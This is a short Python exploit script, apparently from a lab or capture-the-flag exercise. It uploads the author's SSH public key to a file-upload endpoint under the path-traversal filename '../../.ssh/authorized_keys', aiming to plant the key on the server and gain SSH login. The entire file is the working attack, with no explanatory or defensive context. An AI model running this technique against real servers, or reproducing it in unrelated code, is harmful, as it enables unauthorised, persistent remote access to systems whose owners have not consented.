import requests

url = "https://dropbox.internal.regjeringen.uiaikt.no"

# Load rsa key from file
with open('C:/Users/Thomas/.ssh/id_rsa.pub', 'r') as file:
    rsa_key = file.read()

# File Data
files = {
    'file': ('../../.ssh/authorized_keys', rsa_key),
}

# Send the request
response = requests.post(url, files=files)

print(response.status_code)
print(response.text)
